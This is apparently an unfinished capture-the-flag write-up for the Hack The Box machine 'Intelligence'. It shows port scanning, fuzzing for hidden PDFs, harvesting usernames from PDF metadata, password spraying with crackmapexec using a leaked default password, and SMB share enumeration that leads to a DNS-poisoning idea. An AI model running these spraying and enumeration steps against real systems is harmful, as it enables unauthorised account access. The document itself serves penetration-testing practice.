# Intelligence (WIP)

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.95.154
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 04:35 EDT
Nmap scan report for 10.129.95.154
Host is up (0.0068s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49668/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49702/tcp open  unknown
49714/tcp open  unknown
52403/tcp open  unknown
```

We can enumerate the HTTP page.

### HTTP --> PDF Analysis

Page is some kind of company website.

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

We can add `intelligence.htb` to our `/etc/hosts` file as well. Within the page, I noticed there were some downloads:

<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

When we download them, we would get redirected to a PDF which did not have anything useful on it.

<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

The more interesting part is the URL. For the above document, I was redirected to `http://10.129.95.154/documents/2020-01-01-upload.pdf`. We can fuzz this and see what other PDFs are present. We can create a wordlist using this:

```python
for i in range(13):
	for j in range(31):
		print("2020-%02d-%02d-upload.pdf" %(i, j))
```

Afterwards,we can use `wfuzz` to enumerate out all the valid files:

```
$ wfuzz -c -w possible_files --hc=404 http://10.129.95.154/documents/FUZZ 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.95.154/documents/FUZZ
Total requests: 403

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000042:   200        204 L    1130 W     25159 Ch    "2020-01-10-upload.pdf"     
000000036:   200        195 L    1171 W     26086 Ch    "2020-01-04-upload.pdf"     
000000034:   200        198 L    1140 W     25596 Ch    "2020-01-02-upload.pdf"     
000000033:   200        208 L    1172 W     25532 Ch    "2020-01-01-upload.pdf"     
000000057:   200        192 L    1068 W     24926 Ch    "2020-01-25-upload.pdf"     
000000052:   200        126 L    565 W      11018 Ch    "2020-01-20-upload.pdf"     
000000055:   200        135 L    586 W      10972 Ch    "2020-01-23-upload.pdf"     
000000062:   200        192 L    1136 W     25334 Ch    "2020-01-30-upload.pdf"     
000000087:   200        205 L    1232 W     25980 Ch    "2020-02-24-upload.pdf"     
000000054:   200        223 L    1210 W     27246 Ch    "2020-01-22-upload.pdf"     
000000098:   200        201 L    1132 W     24761 Ch    "2020-03-04-upload.pdf"     
000000099:   200        204 L    1092 W     24751 Ch    "2020-03-05-upload.pdf"     
000000091:   200        130 L    564 W      10959 Ch    "2020-02-28-upload.pdf"     
000000086:   200        212 L    1164 W     25994 Ch    "2020-02-23-upload.pdf"     
000000080:   200        131 L    529 W      10693 Ch    "2020-02-17-upload.pdf"     
000000074:   200        197 L    1106 W     23977 Ch    "2020-02-11-upload.pdf"     
000000127:   200        133 L    579 W      10940 Ch    "2020-04-02-upload.pdf"     
000000129:   200        207 L    1172 W     26535 Ch    "2020-04-04-upload.pdf"     
000000115:   200        133 L    529 W      10679 Ch    "2020-03-21-upload.pdf"     
000000111:   200        209 L    1161 W     25873 Ch    "2020-03-17-upload.pdf"     
000000107:   200        203 L    1026 W     23660 Ch    "2020-03-13-upload.pdf"     
000000106:   200        212 L    1169 W     25721 Ch    "2020-03-12-upload.pdf"     
000000140:   200        211 L    1153 W     25408 Ch    "2020-04-15-upload.pdf"     
000000157:   200        193 L    1231 W     26752 Ch    "2020-05-01-upload.pdf"     
000000148:   200        211 L    1050 W     23669 Ch    "2020-04-23-upload.pdf"     
000000199:   200        127 L    564 W      11013 Ch    "2020-06-12-upload.pdf"     
000000202:   200        205 L    1212 W     25761 Ch    "2020-06-15-upload.pdf"     
000000201:   200        185 L    1148 W     25089 Ch    "2020-06-14-upload.pdf"     
000000195:   200        134 L    593 W      10997 Ch    "2020-06-08-upload.pdf"     
000000194:   200        216 L    1162 W     26548 Ch    "2020-06-07-upload.pdf"     
000000191:   200        219 L    1206 W     25575 Ch    "2020-06-04-upload.pdf"     
000000190:   200        135 L    560 W      10865 Ch    "2020-06-03-upload.pdf"     
000000189:   200        211 L    1174 W     26456 Ch    "2020-06-02-upload.pdf"     
000000185:   200        131 L    561 W      11016 Ch    "2020-05-29-upload.pdf"     
000000180:   200        148 L    584 W      11311 Ch    "2020-05-24-upload.pdf"     
000000177:   200        193 L    1165 W     24947 Ch    "2020-05-21-upload.pdf"     
000000176:   200        199 L    1165 W     26127 Ch    "2020-05-20-upload.pdf"     
000000173:   200        206 L    1158 W     25099 Ch    "2020-05-17-upload.pdf"     
000000167:   200        206 L    1161 W     25800 Ch    "2020-05-11-upload.pdf"     
000000163:   200        182 L    1082 W     24719 Ch    "2020-05-07-upload.pdf"     
000000159:   200        207 L    1121 W     24747 Ch    "2020-05-03-upload.pdf"     
000000208:   200        209 L    1111 W     24765 Ch    "2020-06-21-upload.pdf"     
000000238:   200        137 L    630 W      11520 Ch    "2020-07-20-upload.pdf"     
000000242:   200        206 L    1083 W     24933 Ch    "2020-07-24-upload.pdf"     
000000226:   200        140 L    586 W      11368 Ch    "2020-07-08-upload.pdf"     
000000224:   200        182 L    1121 W     23698 Ch    "2020-07-06-upload.pdf"     
000000220:   200        201 L    1112 W     25980 Ch    "2020-07-02-upload.pdf"     
000000217:   200        193 L    1096 W     24297 Ch    "2020-06-30-upload.pdf"     
000000213:   200        204 L    1193 W     25968 Ch    "2020-06-26-upload.pdf"     
000000215:   200        207 L    1124 W     25103 Ch    "2020-06-28-upload.pdf"     
000000212:   200        141 L    551 W      10133 Ch    "2020-06-25-upload.pdf"     
000000250:   200        204 L    1112 W     25658 Ch    "2020-08-01-upload.pdf"     
000000209:   200        206 L    1111 W     24901 Ch    "2020-06-22-upload.pdf"     
000000296:   200        206 L    1171 W     25619 Ch    "2020-09-16-upload.pdf"     
000000293:   200        211 L    1133 W     25266 Ch    "2020-09-13-upload.pdf"     
000000291:   200        145 L    575 W      11526 Ch    "2020-09-11-upload.pdf"     
000000285:   200        192 L    1084 W     25101 Ch    "2020-09-05-upload.pdf"     
000000284:   200        193 L    1108 W     25605 Ch    "2020-09-04-upload.pdf"     
000000282:   200        202 L    1104 W     25771 Ch    "2020-09-02-upload.pdf"     
000000286:   200        192 L    1100 W     24213 Ch    "2020-09-06-upload.pdf"     
000000268:   200        213 L    1171 W     25542 Ch    "2020-08-19-upload.pdf"     
000000269:   200        132 L    549 W      10225 Ch    "2020-08-20-upload.pdf"     
000000258:   200        143 L    577 W      11074 Ch    "2020-08-09-upload.pdf"     
000000252:   200        188 L    1027 W     24102 Ch    "2020-08-03-upload.pdf"     
000000345:   200        185 L    1086 W     24309 Ch    "2020-11-03-upload.pdf"     
000000343:   200        185 L    1124 W     25253 Ch    "2020-11-01-upload.pdf"     
000000330:   200        212 L    1219 W     25880 Ch    "2020-10-19-upload.pdf"     
000000316:   200        126 L    550 W      10745 Ch    "2020-10-05-upload.pdf"     
000000310:   200        196 L    1095 W     24739 Ch    "2020-09-30-upload.pdf"     
000000309:   200        220 L    1112 W     23379 Ch    "2020-09-29-upload.pdf"     
000000307:   200        226 L    1171 W     25487 Ch    "2020-09-27-upload.pdf"     
000000302:   200        193 L    1136 W     23884 Ch    "2020-09-22-upload.pdf"     
000000348:   200        219 L    1134 W     24656 Ch    "2020-11-06-upload.pdf"     
000000397:   200        208 L    1222 W     25507 Ch    "2020-12-24-upload.pdf"     
000000393:   200        136 L    596 W      11315 Ch    "2020-12-20-upload.pdf"     
000000388:   200        209 L    1185 W     25818 Ch    "2020-12-15-upload.pdf"     
000000383:   200        199 L    1153 W     25437 Ch    "2020-12-10-upload.pdf"     
000000372:   200        206 L    1180 W     25876 Ch    "2020-11-30-upload.pdf"     
000000366:   200        132 L    554 W      10863 Ch    "2020-11-24-upload.pdf"     
000000355:   200        133 L    508 W      10588 Ch    "2020-11-13-upload.pdf"     
000000353:   200        205 L    1212 W     25116 Ch    "2020-11-11-upload.pdf"     
000000352:   200        215 L    1090 W     24145 Ch    "2020-11-10-upload.pdf"     
000000403:   200        190 L    1067 W     23833 Ch    "2020-12-30-upload.pdf"     
000000401:   200        126 L    542 W      10905 Ch    "2020-12-28-upload.pdf"
```

Afterwards, we can use the names of the valid files to create a wordlist, remove the RETURN control character and use a basic `bash` for loop to download all of these files.

```bash
tr -d '\r' < valid_files > test
while read i; do wget "http://10.129.95.154/documents/${i}"; done < test
```

Afterwards, we need a way to convert all of these to text so we can read them. This can be done using `pdftotext`.&#x20;

```bash
$ pdftotext 2020-01-01-upload.pdf
$ cat 2020-01-01-upload.txt 
Dolore ut etincidunt adipisci aliquam labore.
Dolore quaerat porro neque amet. Non ipsum quiquia ut dolor modi porro.
Magnam dolor dolor etincidunt magnam adipisci etincidunt magnam. Aliquam
eius ipsum sed amet dolorem voluptatem. Dolore tempora magnam tempora
est ipsum. Modi etincidunt consectetur porro numquam eius magnam velit.
Est consectetur non tempora velit sed labore. Velit sed labore voluptatem est
tempora. Magnam etincidunt consectetur sed dolorem amet labore.
Adipisci est eius voluptatem. Adipisci sed dolorem ut etincidunt non etincidunt
numquam. Quisquam sit tempora voluptatem. Numquam ut dolore consectetur dolor quaerat quisquam. Tempora dolorem dolore dolore etincidunt modi.
Magnam aliquam quisquam porro. Modi est ut numquam dolor dolorem neque.
$ for FILE in *; do pdftotext $FILE; done;
```

Then, we can use `grep` to find keywords in these files.

<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

We have a credential, and also searching for `security` tells me there's some type of vulnerability with the service accounts:

```
$ cat 2020-12-30-upload.txt
Internal IT Update
There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.
```

So now we have to find usernames. Within each PDF file, there seems to be a unique user that created it.

```
$ exiftool -creator 2020-01-01-upload.pdf 
Creator                         : William.Lee
```

We can just do `exiftool -creator *.pdf` to find all the users, and redirect the output into a wordlist. There are about 83 users:

```
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
Danny.Matthews
...
```

Then, we do password spraying with `crackmapexec`.&#x20;

```
$ crackmapexec smb 10.129.95.154 -u files/users -p NewIntelligenceCorpUser9876
...
[+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

### Tiffany SMB --> Poison DNS

We cannot login using `evil-winrm` with this, so let's enumerate the SMB shares.&#x20;

```
$ smbmap -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -H 10.129.95.154
[+] IP: 10.129.95.154:445       Name: 10.129.95.154                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

We see that we have access to IT. Within it, there's only one file:

```
$ smbclient -U Tiffany.Molina //10.129.95.154/IT                              
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021
```

Here's the script:

```powershell
$ cat downdetector.ps1 
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

Earlier I found a hint that the user Ted was running this script continuously. What I find the weirdest is that the URI specified is not hard-coded to point to `intelligence.htb`, but rather it uses `$(record.Name)`.&#x20;

WIP!
